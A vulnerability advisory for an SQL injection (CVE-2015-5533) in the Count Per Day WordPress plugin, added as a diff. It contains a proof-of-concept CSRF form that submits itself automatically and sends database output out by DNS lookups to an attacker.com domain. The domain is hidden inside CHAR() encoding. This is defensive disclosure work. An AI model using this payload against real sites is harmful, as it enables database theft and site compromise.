@@ -1,0 +1,59 @@
+Advisory ID: HTB23267
+Product: Count Per Day WordPress plugin
+Vendor: Tom Braider 
+Vulnerable Version(s): 3.4 and probably prior
+Tested Version: 3.4
+Advisory Publication:  July 1, 2015  [without technical details]
+Vendor Notification: July 1, 2015 
+Vendor Patch: July 1, 2015 
+Public Disclosure: July 22, 2015 
+Vulnerability Type: SQL Injection [CWE-89]
+CVE Reference: CVE-2015-5533
+Risk Level: Medium 
+CVSSv2 Base Score: 6 (AV:N/AC:M/Au:S/C:P/I:P/A:P)
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered SQL Injection vulnerability in Count Per Day WordPress plugin, which can be exploited to execute arbitrary SQL queries in application’s database, gain control of potentially sensitive information and compromise the entire website. 
+
+The vulnerability is caused by insufficient filtration of input data passed via the "cpd_keep_month" HTTP POST parameter to "/wp-admin/options-general.php" script. A remote user with administrative privileges can manipulate SQL queries, inject and execute arbitrary SQL commands within the application’s database. 
+This vulnerability can be exploited by anonymous attacker via CSRF vector, since the web application does not check origin of HTTP requests.
+
+The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):
+
+
+<form action = "http://wordpress/wp-admin/options-general.php?page=count-per-day/counter-options.php&tab=tools" method = "POST" name="f1">
+<input type="hidden" name="collect" value="Collect old data">
+<input type="hidden" name="do" value="cpd_collect">
+<input type="hidden" name="cpd_keep_month" value="6 MONTH) AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 2">
+<input value="go type="submit" />
+</form><script>document.f1.submit();</script>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Update to Count Per Day 3.4.1
+
+More Information:
+https://wordpress.org/plugins/count-per-day/changelog/
+https://plugins.trac.wordpress.org/changeset/1190683/count-per-day
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23267 - https://www.htbridge.com/advisory/HTB23267 - SQL Injection in Count Per Day WordPress Plugin.
+[2] Count Per Day WordPress plugin - https://wordpress.org/plugins/count-per-day/ - A statistics plugin which displays Visit Counter, shows reads and visitors per page, visitors today, yesterday, last week, last months and other statistics.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+[4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[5] ImmuniWeb® SaaS - https://www.htbridge.com/immuniweb/ - hybrid of manual web application penetration test and cutting-edge vulnerability scanner available online via a Software-as-a-Service (SaaS) model.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
